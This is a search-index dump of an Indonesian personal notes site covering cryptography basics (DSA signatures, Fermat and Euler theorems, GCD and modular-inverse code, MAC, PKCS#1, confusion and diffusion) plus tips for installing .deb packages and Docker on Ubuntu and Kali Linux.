hash standard : Secure Hash Algorithm(SHA-1) DSA tidak dapat digunakan untuk enkripsi, DSA dispesifikasikan khusus untuk tanda tangan digital DSA mempunyai 2 fungsi utama : \u00b6 pembangkitan tanda tangan pemeriksaan keabsahan tanda tangan Parameter DSA \u00b6 p, bil.prima, panjangnya L bit, 512 < L < 2046 , L kelipatan 64 (p publik) q, bil.prima 160 bit, merupakan faktor dari p-1 ((p-1) % q = 0) (q publik) g = h^((p-1)/q) mod p , h < p-1 sedemikian sehingga h^((p-1)/q) mod p > 1 (g publik) x, kunci private, bil.bulat < q y = g^x mod p , kunci publik m = pesan Pembangkitan sepasang kunci \u00b6 pilih bil.prima p & q (p-1 mod q = 0) hitung g = h^((p-1)/q) mod p , sehingga 1 < h < p-1 dan h^((p-1)/q) mod p > 1 tentukan kunci private x (x < q) hitung kunci publik y = g^x mod p hasil : parameter publik: p, q, g, y parameter privat: x Pembangkitan tanda tangan \u00b6 hitung message digest H(m) tentukan bil.acak k < q tanda tangan dari pesan m adalah r & s r = (g^k mod p) mod q s = (k^-1 (H(m) + x . r)) mod q kirim m beserta r & s *x: kunci private Verifikasi tanda tangan \u00b6 hitung message digest H(m) verifikasi: w = s^-1 mod q u1 = (H(m) . w) mod q u2 = (r . w) mod q v = ((g^u1 . y^u2) mod p) mod q jika v = r, maka ttd sah Contoh \u00b6 Pembangkitan kunci \u00b6 Pilih bil.prima p & q, (p-1) mod q = 0 p = 59419 q = 3301 hitung g = h^((p-1)/q) mod p , sehingga 1 < h < p-1 dan h^((p-1)/q) mod p > 1 . *h = 100 g = 100^((59419-1)/3301) mod 59419 = 18870 kunci private (x) = 3223 kunci public (y) y = g^x mod p = 18870^3223 mod 59419 = 29245 Pembangkitan tanda tangan \u00b6 hitung nilai hash m, misal H(m) = 4321 tentukan bil.acak k < q k = 997 k^-1 ~= 2907 (mod 3301) hitung r & s r = g^k mod p = 848 s = 183 kirim pesan m dan tanda tangan, (r, s) = (848, 183) Verifikasi tanda tangan \u00b6 hitung nilai hash m, misal H(m) = 4321 verifikasi (r, s) = (848, 183) s^-1 ~= 469 (mod 3301) w = s^-1 mod q = 469 (mod 3301) = 469 u1 = (H(m) . w) mod q = 3036 u2 = (r . w) mod q = 1592 v = 848 karena v = r, maka ttd sah","title":"Digital Signature Standard"},{"location":"kripto/theorem/dss/#digital-signature-standard","text":"","title":"Digital Signature Standard"},{"location":"kripto/theorem/dss/#dss-terdiri-dari-2-komponen","text":"Algoritma tanda tangan digital : DSA Fungsi hash standard : Secure Hash Algorithm(SHA-1) DSA tidak dapat digunakan untuk enkripsi, DSA dispesifikasikan khusus untuk tanda tangan digital","title":"DSS terdiri dari 2 komponen :"},{"location":"kripto/theorem/dss/#dsa-mempunyai-2-fungsi-utama","text":"pembangkitan tanda tangan pemeriksaan keabsahan tanda tangan","title":"DSA mempunyai 2 fungsi utama :"},{"location":"kripto/theorem/dss/#parameter-dsa","text":"p, bil.prima, panjangnya L bit, 512 < L < 2046 , L kelipatan 64 (p publik) q, bil.prima 160 bit, merupakan faktor dari p-1 ((p-1) % q = 0) (q publik) g = h^((p-1)/q) mod p , h < p-1 sedemikian sehingga h^((p-1)/q) mod p > 1 (g publik) x, kunci private, bil.bulat < q y = g^x mod p , kunci publik m = pesan","title":"Parameter DSA"},{"location":"kripto/theorem/dss/#pembangkitan-sepasang-kunci","text":"pilih bil.prima p & q (p-1 mod q = 0) hitung g = h^((p-1)/q) mod p , sehingga 1 < h < p-1 dan h^((p-1)/q) mod p > 1 tentukan kunci private x (x < q) hitung kunci publik y = g^x mod p hasil : parameter publik: p, q, g, y parameter privat: x","title":"Pembangkitan sepasang kunci"},{"location":"kripto/theorem/dss/#pembangkitan-tanda-tangan","text":"hitung message digest H(m) tentukan bil.acak k < q tanda tangan dari pesan m adalah r & s r = (g^k mod p) mod q s = (k^-1 (H(m) + x . r)) mod q kirim m beserta r & s *x: kunci private","title":"Pembangkitan tanda tangan"},{"location":"kripto/theorem/dss/#verifikasi-tanda-tangan","text":"hitung message digest H(m) verifikasi: w = s^-1 mod q u1 = (H(m) . w) mod q u2 = (r . w) mod q v = ((g^u1 . y^u2) mod p) mod q jika v = r, maka ttd sah","title":"Verifikasi tanda tangan"},{"location":"kripto/theorem/dss/#contoh","text":"","title":"Contoh"},{"location":"kripto/theorem/dss/#pembangkitan-kunci","text":"Pilih bil.prima p & q, (p-1) mod q = 0 p = 59419 q = 3301 hitung g = h^((p-1)/q) mod p , sehingga 1 < h < p-1 dan h^((p-1)/q) mod p > 1 . *h = 100 g = 100^((59419-1)/3301) mod 59419 = 18870 kunci private (x) = 3223 kunci public (y) y = g^x mod p = 18870^3223 mod 59419 = 29245","title":"Pembangkitan kunci"},{"location":"kripto/theorem/dss/#pembangkitan-tanda-tangan_1","text":"hitung nilai hash m, misal H(m) = 4321 tentukan bil.acak k < q k = 997 k^-1 ~= 2907 (mod 3301) hitung r & s r = g^k mod p = 848 s = 183 kirim pesan m dan tanda tangan, (r, s) = (848, 183)","title":"Pembangkitan tanda tangan"},{"location":"kripto/theorem/dss/#verifikasi-tanda-tangan_1","text":"hitung nilai hash m, misal H(m) = 4321 verifikasi (r, s) = (848, 183) s^-1 ~= 469 (mod 3301) w = s^-1 mod q = 469 (mod 3301) = 469 u1 = (H(m) . w) mod q = 3036 u2 = (r . w) mod q = 1592 v = 848 karena v = r, maka ttd sah","title":"Verifikasi tanda tangan"},{"location":"kripto/theorem/ecb/","text":"","title":"ECB"},{"location":"kripto/theorem/fermat/","text":"Fermat Little Theorem \u00b6 part 1 \u00b6 Mengatakan bahwa jika \\(p\\) bil.prima, maka setiap \\(\\alpha\\) , berlaku \\(\\alpha^p - \\alpha\\) adalah bilangan bulat kelipatan \\(p\\) a = 2 p = 3 a^p - a = 6 6 adalah kelipatan 3 \\(\\alpha^p \\equiv \\alpha \\ (\\bmod p)\\) part 2 \u00b6 jika \\(\\alpha\\) tidak dapat dibagi \\(p\\) , maka berlaku \\(\\alpha^{p-1} - 1\\) adalah bilangan bulat kelipatan \\(p\\) \\(\\alpha^{p-1} \\equiv 1 \\ (\\bmod p)\\) Fermat's Factorization Method \u00b6 \\(N = a^2 - b^2\\) Warning belum selesai Generalisasi \u00b6 Euler's Theorem \u00b6 untuk setiap modulus \\(n\\) dan setiap bilangan bulat \\(\\alpha\\) coprime dengan \\(n\\) \\(\\alpha^{\u03c6(n)} \\equiv 1 \\ (\\bmod n)\\) juga berlaku jika \\(x \\equiv y \\ (\\bmod \u03c6(n))\\) untuk setiap bil.bulat \\(x\\) & \\(y\\) , menyebabkan \\(\\alpha^x \\equiv \\alpha^y \\ (\\bmod n)\\) Sumber \u00b6 https://en.wikipedia.org/wiki/Fermat%27s_little_theorem \u21a9 https://en.wikipedia.org/wiki/Fermat's_factorization_method \u21a9","title":"Fermat's little theorem"},{"location":"kripto/theorem/fermat/#fermat-little-theorem","text":"","title":"Fermat Little Theorem"},{"location":"kripto/theorem/fermat/#part-1","text":"Mengatakan bahwa jika \\(p\\) bil.prima, maka setiap \\(\\alpha\\) , berlaku \\(\\alpha^p - \\alpha\\) adalah bilangan bulat kelipatan \\(p\\) a = 2 p = 3 a^p - a = 6 6 adalah kelipatan 3 \\(\\alpha^p \\equiv \\alpha \\ (\\bmod p)\\)","title":"part 1"},{"location":"kripto/theorem/fermat/#part-2","text":"jika \\(\\alpha\\) tidak dapat dibagi \\(p\\) , maka berlaku \\(\\alpha^{p-1} - 1\\) adalah bilangan bulat kelipatan \\(p\\) \\(\\alpha^{p-1} \\equiv 1 \\ (\\bmod p)\\)","title":"part 2"},{"location":"kripto/theorem/fermat/#fermats-factorization-method","text":"\\(N = a^2 - b^2\\) Warning belum selesai","title":"Fermat's Factorization Method"},{"location":"kripto/theorem/fermat/#generalisasi","text":"","title":"Generalisasi"},{"location":"kripto/theorem/fermat/#eulers-theorem","text":"untuk setiap modulus \\(n\\) dan setiap bilangan bulat \\(\\alpha\\) coprime dengan \\(n\\) \\(\\alpha^{\u03c6(n)} \\equiv 1 \\ (\\bmod n)\\) juga berlaku jika \\(x \\equiv y \\ (\\bmod \u03c6(n))\\) untuk setiap bil.bulat \\(x\\) & \\(y\\) , menyebabkan \\(\\alpha^x \\equiv \\alpha^y \\ (\\bmod n)\\)","title":"Euler's Theorem"},{"location":"kripto/theorem/fermat/#sumber","text":"https://en.wikipedia.org/wiki/Fermat%27s_little_theorem \u21a9 https://en.wikipedia.org/wiki/Fermat's_factorization_method \u21a9","title":"Sumber"},{"location":"kripto/theorem/fn/","text":"","title":"Feistel Network"},{"location":"kripto/theorem/gcd_egcd/","text":"GCD & EGCD \u00b6 Euclids Algorithm \u00b6 Note : a%b = a - (a//b)*b a.x \u2261 1 (mod m) x \u2261 1/a (mod m) x \u2261 a^(-1) (mod m) GCD \u00b6 Source code : (python) def gcd ( a , b ): print ( a , b ) if a == 0 : return b return gcd ( b % a , a ) a = 210 b = 118 print ( gcd ( a , b )) output 210 118 118 210 92 118 26 92 14 26 12 14 2 12 0 2 2 Penjelasan a b 210 118 b%a a 118 210 a%(b%a) b%a 92 118 (b%a)%(a%(b%a)) a%(b%a) ... ... iter a b x y 0 b%a a 1 b0%a0 a0 2 b1%a1 a1 3 b2%a2 a2 ... EGCD \u00b6 a.x + b.y = GCD(a, b) def egcd ( a , b ): print ( a , b ) if a == 0 : print ( '------' ) print ( a , b , '0' , '1' ) return b , 0 , 1 gcd , x1 , y1 = egcd ( b % a , a ) x = y1 - ( b // a ) * x1 y = x1 print ( a , b , x , y ) return gcd , x , y print ( '(gcd, x, y) :' , egcd ( a , b )) output 210 118 118 210 92 118 26 92 14 26 12 14 2 12 0 2 ------ 0 2 0 1 2 12 1 0 12 14 -1 1 14 26 2 -1 26 92 -7 2 92 118 9 -7 118 210 -16 9 210 118 9 -16 (gcd, x, y) : (2, 9, -16) Penjelasan iter a b x y 0 0 2 0 1 1 2 12 1 0 2 12 14 -1 1 3 14 26 2 -1 4 26 92 -7 2 5 92 118 9 -7 6 118 210 -16 9 7 210 118 9 -16 karena nilai y merupakan nilai x sebelumnya, maka tinggal mencari nilai x X(n) = Y(n-1) - (A(n)//B(n))*X(n-1) Y(n) = X(n-1)","title":"GCD & EGCD"},{"location":"kripto/theorem/gcd_egcd/#gcd-egcd","text":"","title":"GCD &amp; EGCD"},{"location":"kripto/theorem/gcd_egcd/#euclids-algorithm","text":"Note : a%b = a - (a//b)*b a.x \u2261 1 (mod m) x \u2261 1/a (mod m) x \u2261 a^(-1) (mod m)","title":"Euclids Algorithm"},{"location":"kripto/theorem/gcd_egcd/#gcd","text":"Source code : (python) def gcd ( a , b ): print ( a , b ) if a == 0 : return b return gcd ( b % a , a ) a = 210 b = 118 print ( gcd ( a , b )) output 210 118 118 210 92 118 26 92 14 26 12 14 2 12 0 2 2 Penjelasan a b 210 118 b%a a 118 210 a%(b%a) b%a 92 118 (b%a)%(a%(b%a)) a%(b%a) ... ... iter a b x y 0 b%a a 1 b0%a0 a0 2 b1%a1 a1 3 b2%a2 a2 ...","title":"GCD"},{"location":"kripto/theorem/gcd_egcd/#egcd","text":"a.x + b.y = GCD(a, b) def egcd ( a , b ): print ( a , b ) if a == 0 : print ( '------' ) print ( a , b , '0' , '1' ) return b , 0 , 1 gcd , x1 , y1 = egcd ( b % a , a ) x = y1 - ( b // a ) * x1 y = x1 print ( a , b , x , y ) return gcd , x , y print ( '(gcd, x, y) :' , egcd ( a , b )) output 210 118 118 210 92 118 26 92 14 26 12 14 2 12 0 2 ------ 0 2 0 1 2 12 1 0 12 14 -1 1 14 26 2 -1 26 92 -7 2 92 118 9 -7 118 210 -16 9 210 118 9 -16 (gcd, x, y) : (2, 9, -16) Penjelasan iter a b x y 0 0 2 0 1 1 2 12 1 0 2 12 14 -1 1 3 14 26 2 -1 4 26 92 -7 2 5 92 118 9 -7 6 118 210 -16 9 7 210 118 9 -16 karena nilai y merupakan nilai x sebelumnya, maka tinggal mencari nilai x X(n) = Y(n-1) - (A(n)//B(n))*X(n-1) Y(n) = X(n-1)","title":"EGCD"},{"location":"kripto/theorem/mac/","text":"Message Authentication Code \u00b6 Definisi \u00b6 MAC : Kode yang dihasilkan oleh fungsi hash satu-arah namun menggunakan kunci rahasia dalam pembangkitan nilai hash MAC = Ck(M) MAC: nilai hash C: fungsi hash (algoritma MAC) K: kunci rahasia","title":"MAC"},{"location":"kripto/theorem/mac/#message-authentication-code","text":"","title":"Message Authentication Code"},{"location":"kripto/theorem/mac/#definisi","text":"MAC : Kode yang dihasilkan oleh fungsi hash satu-arah namun menggunakan kunci rahasia dalam pembangkitan nilai hash MAC = Ck(M) MAC: nilai hash C: fungsi hash (algoritma MAC) K: kunci rahasia","title":"Definisi"},{"location":"kripto/theorem/mmi/","text":"Modular Mulitplicative Inverse \u00b6 source geeksforgeeks Input: a = 3, m = 11 Output: 4 3.x mod 11 = 1 3.4 mod 11 = 1 4 < 11 Method \u00b6 Naive Method, O(m) Extended Euler\u2019s GCD algorithm, O(Log m) [Works when a and m are coprime] Fermat\u2019s Little theorem, O(Log m) [Works when \u2018m\u2019 is prime] Method 1 \u00b6 Time Complexity: O(m) def modInverse ( a , m ): for x in range ( 1 , m ): if ((( a % m ) * ( x % m )) % m == 1 ): return x return - 1 a = 3 m = 11 print ( modInverse ( a , m )) Method 2 \u00b6 (Works when m and a are coprime) Time Complexity: O(Log m) def modInverse ( a , m ): m0 = m y = 0 x = 1 if ( m == 1 ): return 0 while ( a > 1 ): # q is quotient q = a // m t = m # m is remainder now, process # same as Euclid's algo m = a % m a = t t = y # Update x and y y = x - q * y x = t # Make x positive if ( x < 0 ): x = x + m0 return x a = 3 m = 11 print ( \"Modular multiplicative inverse is\" , modInverse ( a , m )) Bentuk sederhana def modInv ( a , m , x1 , y1 ): if a <= 1 : if y1 < 0 : y1 += x1 return y1 x = y1 - ( a // m ) * x1 y = x1 return modInv ( m , a % m , x , y ) a , m = 13 , 107 x , y = 0 , 1 print ( modInv ( a , m , x , y )) Method 3 \u00b6 (Works when m is prime) Time Complexity: O(Log m) def modInverse ( a , m ): g = gcd ( a , m ) if ( g != 1 ): print ( \"Inverse doesn't exist\" ) else : # If a and m are relatively prime, # then modulo inverse is a^(m-2) mode m print ( \"Modular multiplicative inverse is \" , power ( a , m - 2 , m )) # To compute x^y under modulo m def power ( x , y , m ): if ( y == 0 ): return 1 p = power ( x , y // 2 , m ) % m p = ( p * p ) % m if ( y % 2 == 0 ): return p else : return (( x * p ) % m ) # Function to return gcd of a and b def gcd ( a , b ): if ( a == 0 ): return b return gcd ( b % a , a ) # Driver Code a = 3 m = 11 # Function call modInverse ( a , m ) Bentuk sederhana a = 3 m = 11 print ( pow ( a , m - 2 , m )) # a**(m-2) % m","title":"Modular Multiplicative Inverse"},{"location":"kripto/theorem/mmi/#modular-mulitplicative-inverse","text":"source geeksforgeeks Input: a = 3, m = 11 Output: 4 3.x mod 11 = 1 3.4 mod 11 = 1 4 < 11","title":"Modular Mulitplicative Inverse"},{"location":"kripto/theorem/mmi/#method","text":"Naive Method, O(m) Extended Euler\u2019s GCD algorithm, O(Log m) [Works when a and m are coprime] Fermat\u2019s Little theorem, O(Log m) [Works when \u2018m\u2019 is prime]","title":"Method"},{"location":"kripto/theorem/mmi/#method-1","text":"Time Complexity: O(m) def modInverse ( a , m ): for x in range ( 1 , m ): if ((( a % m ) * ( x % m )) % m == 1 ): return x return - 1 a = 3 m = 11 print ( modInverse ( a , m ))","title":"Method 1"},{"location":"kripto/theorem/mmi/#method-2","text":"(Works when m and a are coprime) Time Complexity: O(Log m) def modInverse ( a , m ): m0 = m y = 0 x = 1 if ( m == 1 ): return 0 while ( a > 1 ): # q is quotient q = a // m t = m # m is remainder now, process # same as Euclid's algo m = a % m a = t t = y # Update x and y y = x - q * y x = t # Make x positive if ( x < 0 ): x = x + m0 return x a = 3 m = 11 print ( \"Modular multiplicative inverse is\" , modInverse ( a , m )) Bentuk sederhana def modInv ( a , m , x1 , y1 ): if a <= 1 : if y1 < 0 : y1 += x1 return y1 x = y1 - ( a // m ) * x1 y = x1 return modInv ( m , a % m , x , y ) a , m = 13 , 107 x , y = 0 , 1 print ( modInv ( a , m , x , y ))","title":"Method 2"},{"location":"kripto/theorem/mmi/#method-3","text":"(Works when m is prime) Time Complexity: O(Log m) def modInverse ( a , m ): g = gcd ( a , m ) if ( g != 1 ): print ( \"Inverse doesn't exist\" ) else : # If a and m are relatively prime, # then modulo inverse is a^(m-2) mode m print ( \"Modular multiplicative inverse is \" , power ( a , m - 2 , m )) # To compute x^y under modulo m def power ( x , y , m ): if ( y == 0 ): return 1 p = power ( x , y // 2 , m ) % m p = ( p * p ) % m if ( y % 2 == 0 ): return p else : return (( x * p ) % m ) # Function to return gcd of a and b def gcd ( a , b ): if ( a == 0 ): return b return gcd ( b % a , a ) # Driver Code a = 3 m = 11 # Function call modInverse ( a , m ) Bentuk sederhana a = 3 m = 11 print ( pow ( a , m - 2 , m )) # a**(m-2) % m","title":"Method 3"},{"location":"kripto/theorem/ofb/","text":"","title":"OFB"},{"location":"kripto/theorem/pkcs1/","text":"Public Key Cryptography Standard \u00b6 Definisi \u00b6 Basic definition dan rekomendasi untuk implementasi algoritma RSA guna public-key cryptography hal-hal terkait : mathematical properties untuk public dan private keys primitive operations untuk enkripsi dan signature skema secure cryptography representasi sintaks ASN.1 PKCS#1 menghendaki multi-prime keys \\(n = r_1 \\cdot r_2 \\cdot r_3 \\cdot ... \\cdot r_i\\) untuk \\(i \\geq 2\\) Sumber \u00b6 https://en.wikipedia.org/wiki/PKCS_1 \u21a9","title":"PKCS 1"},{"location":"kripto/theorem/pkcs1/#public-key-cryptography-standard","text":"","title":"Public Key Cryptography Standard"},{"location":"kripto/theorem/pkcs1/#definisi","text":"Basic definition dan rekomendasi untuk implementasi algoritma RSA guna public-key cryptography hal-hal terkait : mathematical properties untuk public dan private keys primitive operations untuk enkripsi dan signature skema secure cryptography representasi sintaks ASN.1 PKCS#1 menghendaki multi-prime keys \\(n = r_1 \\cdot r_2 \\cdot r_3 \\cdot ... \\cdot r_i\\) untuk \\(i \\geq 2\\)","title":"Definisi"},{"location":"kripto/theorem/pkcs1/#sumber","text":"https://en.wikipedia.org/wiki/PKCS_1 \u21a9","title":"Sumber"},{"location":"kripto/theorem/sbox/","text":"","title":"S-Box"},{"location":"kripto/theorem/shannon/","text":"Confusion & Diffusion Shannon \u00b6 Confusion \u00b6 Menyembunyikan hubungan antar plaintext, ciphertext, & kunci. Menyembunyikan pola statistik contoh : one-time-pad DES mengimplementasikan substitusi dengan kotak-S Confusion \u00b6 Menyebarkan pengaruh satu bit plaintext/kunci ke sebanyak mungkin ciphertext contoh : CBC, CFB Pada DES, diffusion direalisasikan dengan menggunakan operasi permutasi ( hanya sekedar prinsip/deskripsi, jd tdk begitu jelas :D )","title":"Confusion & Diffusion Shannon"},{"location":"kripto/theorem/shannon/#confusion-diffusion-shannon","text":"","title":"Confusion &amp; Diffusion Shannon"},{"location":"kripto/theorem/shannon/#confusion","text":"Menyembunyikan hubungan antar plaintext, ciphertext, & kunci. Menyembunyikan pola statistik contoh : one-time-pad DES mengimplementasikan substitusi dengan kotak-S","title":"Confusion"},{"location":"kripto/theorem/shannon/#confusion_1","text":"Menyebarkan pengaruh satu bit plaintext/kunci ke sebanyak mungkin ciphertext contoh : CBC, CFB Pada DES, diffusion direalisasikan dengan menggunakan operasi permutasi ( hanya sekedar prinsip/deskripsi, jd tdk begitu jelas :D )","title":"Confusion"},{"location":"kripto/twofish/","text":"","title":"Twofish Basic"},{"location":"kuliah/","text":"Mata Kuliah \u00b6 Daftar mata kuliah tersedia beserta link Informatika : sementara dapat diakses melalui old wetofu","title":"Mata Kuliah"},{"location":"kuliah/#mata-kuliah","text":"Daftar mata kuliah tersedia beserta link Informatika : sementara dapat diakses melalui old wetofu","title":"Mata Kuliah"},{"location":"tips/deb-file/","text":"Install / Remove .deb in ubuntu \u00b6 install : \u00b6 sudo dpkg -i packagename.deb jika diperlukan sudo apt-get install -f atau sudo apt install packagename.deb # atau sudo apt install ./packagename.deb terus sudo apt update remove : \u00b6 sudo dpkg -r packagename # atau sudo apt-get remove packagename maksa install : \u00b6 sudo aptitude install packagename maksa hapus : \u00b6 sudo dpkg --purge packagename jika update ada kendala lock, remove di /etc/apt/sources.list.d/ , atau paling aman reboot laptop aja","title":"Install / Remove .deb in ubuntu"},{"location":"tips/deb-file/#install-remove-deb-in-ubuntu","text":"","title":"Install / Remove .deb in ubuntu"},{"location":"tips/deb-file/#install","text":"sudo dpkg -i packagename.deb jika diperlukan sudo apt-get install -f atau sudo apt install packagename.deb # atau sudo apt install ./packagename.deb terus sudo apt update","title":"install :"},{"location":"tips/deb-file/#remove","text":"sudo dpkg -r packagename # atau sudo apt-get remove packagename","title":"remove :"},{"location":"tips/deb-file/#maksa-install","text":"sudo aptitude install packagename","title":"maksa install :"},{"location":"tips/deb-file/#maksa-hapus","text":"sudo dpkg --purge packagename jika update ada kendala lock, remove di /etc/apt/sources.list.d/ , atau paling aman reboot laptop aja","title":"maksa hapus :"},{"location":"tips/docker/","text":"Docker \u00b6 Pengeertian Umum \u00b6 https://aws.amazon.com/id/docker/ Docker adalah platform perangkat lunak yang memungkinkan Anda membuat, menguji, dan menerapkan aplikasi dengan cepat. Docker mengemas perangkat lunak ke dalam unit standar yang disebut kontainer yang memiliki semua yang diperlukan perangkat lunak agar dapat berfungsi termasuk pustaka, alat sistem, kode, dan waktu proses. Dengan menggunakan Docker, Anda dapat dengan cepat menerapkan dan menskalakan aplikasi ke lingkungan apa pun dan yakin bahwa kode Anda akan berjalan. https://www.niagahoster.co.id/blog/docker-tutorial/ Docker adalah aplikasi open source untuk menyatukan file-file yang dibutuhkan sebuah software sehingga menjadi menjadi satu kesatuan yang lengkap dab berfungsi. Data pengaturan dan file pendukung disebut sebagai image. Selanjutnya kumpulan image digabung dalam satu wadah yang disebut Container. Docker merupakan solusi dari permasalahan yang kerap dialami para developer untuk mengembangkan aplikasi mereka agar bisa berjalan fleksibel di berbagai lingkungan. Docker menjadi perhatian para developer sejak tahun 2013, diperkenalkan oleh Solomon Hykes dalam acara PyCon US. Beberapa waktu setelahnya, Docker dirilis pertama kali pada bulan Juni tahun 2014. Docker dikembangkan oleh Solomon bersama rekannya Andrea Luzzardi dan Francois-Xavier Bourlet. Pada saat itu Docker merupakan proyek internal dotCloud. Hasilnya, saat ini Docker sudah menjadi platform populer di lingkungan para developer di berbagai belahan dunia meskipun belum terlalu populer di Indonesia. Docker sendiri merupakan sebuah perusahaan yang menyediakan layanan platform kontainer. Kemampuan yang dimiliki Docker yaitu mampu menjalankan berbagai macam aplikasi dengan konfigurasi sistem yang berbeda-beda, meskipun masih dalam satu perangkat komputer atau server. Fitur Docker \u00b6 https://www.niagahoster.co.id/blog/docker-tutorial/ Berikut ini adalah fitur Docker yang bisa Anda gunakan sesuai dengan kebutuhan. Docker Engine, digunakan untuk membangun Docker images dan membuat kontainer Docker. Docker Hub, registry yang digunakan untuk berbagai macam Docker images Docker Compose, digunakan untuk mendefinisikan aplikasi menggunakan banyak kontainer Docker. Docker untuk Mac, memungkinkan menjalankan kontainer Docker pada Mac. Docker untuk Linux, memungkinkan menjalankan kontainer Docker pada Linux. Docker untuk Windows, memungkinkan menjalankan kontainer Docker pada Windows. Cara kerja \u00b6 https://aws.amazon.com/id/docker/ Docker berfungsi dengan menyediakan cara standar untuk menjalankan kode Anda. Docker adalah sistem operasi untuk kontainer. Mirip dengan cara mesin virtual memvirtualisasi (menghilangkan kebutuhan untuk secara langsung mengelola) perangkat keras server, kontainer memvirtualisasi sistem operasi server. Docker diinstal di setiap server dan memberikan perintah sederhana yang dapat Anda gunakan untuk membuat, memulai, atau menghentikan kontainer. https://www.niagahoster.co.id/blog/docker-tutorial/ Untuk lebih memahami Docker, sebaiknya Anda mengetahui cara kerja Docker. Ada beberapa komponen yang perlu Anda ketahui: Docker image, merupakan file berisi informasi dan petunjuk untuk membangun container. Image juga berfungsi untuk menggunakan dan mengirimkan informasi; Container, adalah lingkungan untuk mengemas dan menjalankan aplikasi. Ini mencakup kode, runtime, system tools, dan pengaturan. Container hanya bisa mengakses resource yang telah ditentukan dalam docker image; Docker client, yaitu tempat di mana pengguna dapat mengirimkan perintah seperti docker build, docker pull, dan docker run kepada Docker daeomon; Docker Engine Rest API, digunakan untuk berinteraksi dengan Docker daemon. Ini bisa diakses klien melalui HTTP; Docker host, menyediakan lingkungan yang lengkap untuk menjalankan aplikasi. Dia bertanggung jawab terhadap penerimaan perintah yang diberikan Docker client; Docker daemon, yaitu proses pengelolaan Docker images, kontainer, network, dan storage volumes. Docker daemon menerima request dari Docker API dan akan memprosesnya; Docker registry, wadah untuk menyimpan Docker image. Docker image akan memberi reaksi sesuai perintah yang diberikan. Misalnya saat diberi perintah docker push, docker image akan didorong atau dibagikan ke registri Docker Hub; Docker Hub adalah layanan yang disediakan untuk menemukan dan berbagi gambar container dengan tim. Kapan menggunakan Docker \u00b6 https://aws.amazon.com/id/docker/ Anda dapat menggunakan kontainer Docker sebagai blok penyusun inti yang menciptakan aplikasi dan platform modern. Docker mempermudah pembuatan dan menjalankan arsitektur layanan mikro terdistribusi, menerapkan kode Anda dengan pipeline integrasi dan pengiriman berkelanjutan yang terstandardisasi, membangun sistem pemrosesan data dengan skalabilitas yang tinggi, dan membuat platform yang sepenuhnya dikelola untuk pengembang Anda. Install : Ubuntu 20.04 \u00b6 apt -y install curl curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 7EA0A9C3F273FCD8 sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $( lsb_release -cs ) stable\" sudo apt update apt-cache policy docker-ce Install : Kali Linux \u00b6 install docker : sudo apt update sudo apt install -y docker.io sudo systemctl enable docker --now docker agar tdk sudo : sudo usermod -aG docker $USER cek : sudo systemctl status docker install docker-ce : printf \"%s\\n\" \"deb [arch=amd64] https://download.docker.com/linux/debian buster stable\" | sudo tee /etc/apt/sources.list.d/docker-ce.list curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - sudo apt-key fingerprint 0EBFCD88 sudo apt update sudo apt install -y docker-ce docker-ce-cli containerd.io cek status sudo apt install -y docker-ce sudo systemctl status docker Membuat agar tidak perlu sudo lagi sudo usermod -aG docker ${ USER } su - ${ USER } id -nG Atau secara explisit menambahkan username ke group docker sudo usermod -aG docker username Beberapa Command \u00b6 docker [ option ] [ command ] [ arguments ] docker docker docker-subcommand --help docker info sudo docker run hello-world sudo docker search ubuntu sudo docker pull ubuntu sudo docker run ubuntu sudo docker images Run Docker Container Tambahkan -it untuk interactive shell access # docker run -it ubuntu bash sudo docker run -it ubuntu Managing Docker sudo docker ps sudo docker ps -a sudo docker ps -l sudo docker start 9b0db8a30ad1 ( 9b0db8a30ad1 adalah container-id ) sudo docker stop xenodochial_neumann sudo docker rm youthful_roentgen cek image : docker images hub.docker.com cari image (misal mongo db) docker pull mongo docker pull mongo:4.1 cek container : # yg running docker container ls # yg running / tdk docker container ls --all buat container docker container create --name coba-docker-mongo mongo:4.1 docker container create --name coba-docker-mongo2 mongo:4.1 start container docker container start coba-docker-mongo docker container start coba-docker-mongo2 stop container docker container stop coba-docker-mongo coba-docker-mongo2 menghapus container docker container rm coba-docker-mongo coba-docker-mongo2 membuat container export port (agar container dpt diakses dr luar) docker container create --name mongoserver1 -p 8080 :27017 mongo:4.1 docker container create --name mongoserver1 -p 8081 :27017 mongo:4.1 # 8080 : port utk luar # 27017 : port dari container menghapus image docker image rm mongo:4.1 membuat image docker secara manual misal file golang file https://github.com/ProgrammerZamanNow/belajar-docker/blob/master/main.go vim Dockerfile FROM golang:1.11.4 COPY main.go /home/syahrolus/Documents/temp/main.go CMD [ \"go\" , \"run\" , \"/home/syahrolus/Documents/temp/main.go\" ] docker build --tag coba-app-golang:1.0 . docker container create --name app1 -p 8080 :8080 app-golang:1.0 docker container start app1 upload ke registry https://hub.docker.com create a repository misal nama belajar-repo-docker docker login username : <username> password : <password> docker tag app-golang:1.0 syahrolus/app-golang:1.0 docker push syahrolus/app-golang:1.0 masuk docker attach <id_container/nama> langsung remove container ketika disconnect docker run --rm <images> Istilah \u00b6 sumber : https://id.wikipedia.org/wiki/Daemon *Daemon Daemon (Inggris: daemon) (IPA: /'de\u026am\u0259n/ atau /'dim\u0259n/[1]) adalah program komputer yang berjalan di latar belakang (berlawanan dengan program yang dapat dikontrol langsung) yang melakukan beberapa tugas tanpa intervensi dari pengguna. Daemon pada umumnya dimulai pada saat proses pengebutan sebagai proses, seperti halnya perangkat lunak lainnya. Contoh dari daemon adalah telnet daemon, yang terus berjalan di latar belakang, dan menunggu permintaan koneksi dari pengguna klien telnet. Telah menjadi konsensus untuk memberi nama suatu daemon dengan nama yang diakhiri oleh huruf \"d\" (diambil dari huruf pertama daemon), contohnya syslogd, daemon yang menangani log sistem; sshd, daemon yang menangani koneksi SSH), dan juga HTTPd yang merupakan daemon yang menjawab permintaan dari klien yang dilakukan melalui peramban web. Dalam lingkungan sistem operasi mirip Unix, proses parent dari sebuah daemon adalah init (PPID=1). Daemon, pada umumnya menggunakan protokol Remote Procedure Call (RPC) untuk membuka koneksi dengan klien. Windows Dalam keluarga Windows, service memiliki konsep yang sama dengan daemon. Service berjalan sebagai sebuah proses, umumnya tidak berinteraksi dengan papan kunci, monitor dan tetikus, serta pada umumnya prosesnya dimulai pada saat pengebutan. Sumber \u00b6 https://aws.amazon.com/id/docker/ \u21a9 https://www.niagahoster.co.id/blog/docker-tutorial/ 